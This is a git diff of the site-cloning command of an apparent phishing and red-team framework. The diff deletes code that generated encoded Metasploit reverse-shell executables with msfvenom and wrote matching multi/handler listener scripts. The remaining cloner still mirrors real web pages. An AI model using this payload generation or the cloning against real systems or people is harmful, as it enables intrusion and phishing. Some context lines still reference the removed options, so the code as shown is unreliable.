@@ -31,37 +31,10 @@ class Cloner < Cartero::Command
     		@options.apache = true
   		end
 
-  		opts.on("--msfvenom", "Sets flag to use msfvenom command") do
-    		@options.msfvenom = true
-  		end
-
-			opts.separator ""
-			opts.separator "Payload options:"
 			opts.on("-P", "--payload [PAYLOAD_PATH]", String,
 				"Sets payload path") do |payload|
 				@options.payload = payload
 			end
-
-			opts.on("-m","--msfpayload [MSF_PAYLOAD]", String,
-				"Sets msfpayload type") do |payload|
-				@options.msfpayload = payload
-			end
-
-			opts.on("-a","--msfarch [ARCH]", String,
-				"Sets msfpayload architecture") do |arch|
-				@options.msfarch = arch
-			end
-
-			opts.on("-o, ""--msfoptions [MSF_OPTIONS]", String,
-				"Sets options for --msfpayload") do |opt|
-				@options.msfoptions = opt
-			end
-
-			opts.on("-n","--msfname [NAME]", String,
-				"Sets msf payload name") do |name|
-				@options.msfname = name
-			end
-
     end
 	end
 	attr_accessor :url
@@ -74,8 +47,6 @@ class Cloner < Cartero::Command
 	attr_accessor :apache
 	attr_accessor :useragent
 	attr_accessor :domain_info
-	attr_accessor :msfpayload
-	attr_accessor :msfvenom
 
 	def setup
 		require 'erb'
@@ -99,12 +70,13 @@ class Cloner < Cartero::Command
 		elsif ( !@options.msfpayload.nil? )
 			@msfpayload = true
 		end
+
 		@msfvenom		= @options.msfvenom
 		@url 				= @options.url
 		@url_route 	= URI.parse(@options.url).path
 		@path 			= File.expand_path @options.path
 		@webserver 	= @options.webserver
-		@payload 		= @options.payload || path + "/"  +  webserver.underscore + "/payload/" + @options.msfname
+		@payload 		= @options.payload
 		@wget 			= @options.wget
 		@apache 		= @options.apache
 		@useragent 	= @options.useragent || "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
@@ -115,43 +87,7 @@ class Cloner < Cartero::Command
 		puts "Cloning URL #{@url}"
 		create_structure
 		clone
-		if msfvenom
-			payload_name = path + "/"  +  webserver.underscore + "/payload/" + (@options.msfname || "download")
-			handler_name = path + "/"  +  webserver.underscore + "/payload/handler.rc"
-			
-			cmd = "msfvenom -p #{@options.msfpayload} " + 
-					  "-f exe -e -i 3 -s 480 " + 
-					  "#{"--arch #{@options.msfarch} " if @options.msfarch}" + 
-					  @options.msfoptions + " > #{payload_name}" 
-			
-			puts "Generating MSF payload using msfvenom directly"
-			puts "\t#{cmd}"
-			system(cmd)
-			puts "Payload saved as #{payload_name}"
-			puts "MSF handler script saved as #{handler_name}"
-			ops = payload_options(@options.msfoptions)
-			File.open(handler_name, "w") do |x|
-				x << "use exploit/multi/handler\n" +
-             "set PAYLOAD #{@options.payload}\n" +
-             "set LHOST #{ops["LHOST"]}\n" +
-             "set LPORT #{ops["LPORT"] || "4444"}\n" +
-             "set ExitOnSession false\n" +
-             "exploit -j\n"
-      end
-		elsif msfpayload
-			puts "Generating MSF payload #{@options.msfpayload} with options #{@options.msfoptions}"
-			require 'cartero/payloads'
-			@msfpayload = Cartero::Payloads.new({ :payload=> @options.msfpayload , :encoder=>"x86/shikata_ga_nai", 
-																						:format=>"exe", :iterations=>3, :space=>480, :arch => @options.msfarch })
-			@msfpayload.payload_options(@options.msfoptions)
-			msfpayload.generate
-			payload_name = path + "/"  +  webserver.underscore + "/payload/" + (@options.msfname || "download")
-			puts "Payload saved as #{payload_name}"
-			msfpayload.output(File.open(payload_name, "w"))
-			handler_name = path + "/"  +  webserver.underscore + "/payload/handler.rc"
-			puts "MSF handler script saved as #{handler_name}"
-			File.open(handler_name, "w") {|x| x << msfpayload.generate_listener_script }
-		end
+
 		if apache
 			puts "Generating Apache mod_proxy config file"
 			create_apache_conf
@@ -163,9 +99,6 @@ class Cloner < Cartero::Command
 		Dir.mkdir path + "/"  + name unless File.directory?(path + "/"  + name)
 		Dir.mkdir path + "/"  + name + "/static" unless File.directory? path + "/"  + name + "/static"
 		Dir.mkdir path + "/"  + name + "/views" unless File.directory? path + "/"  + name + "/views"
-		if msfpayload
-			Dir.mkdir path + "/"  + name + "/payload" unless File.directory? path + "/"  + name + "/payload"
-		end
 	end
 
 	def clone
@@ -194,33 +127,6 @@ class Cloner < Cartero::Command
 		else
 			create_index(page)
 		end
-	end
-
-
-   def payload_options(args)
-    ds = {}
-    if args
-      args.split(" ").each do |x|
-        k,v = x.split('=', 2)
-        ds[k.upcase] = v.to_s
-      end
-      if @options.msfpayload.to_s =~ /[\_\/]reverse/ and ds['LHOST'].nil?
-        ds['LHOST'] = local_ip
-      end
-    end
-    ds
-  end
-
-	def local_ip
-		require 'socket'
-	  orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true
-	 
-	  UDPSocket.open do |s|
-	    s.connect '64.233.187.99', 1
-	    s.addr.last
-	  end
-	ensure
-	  Socket.do_not_reverse_lookup = orig
 	end
 
 	def create_index(page)
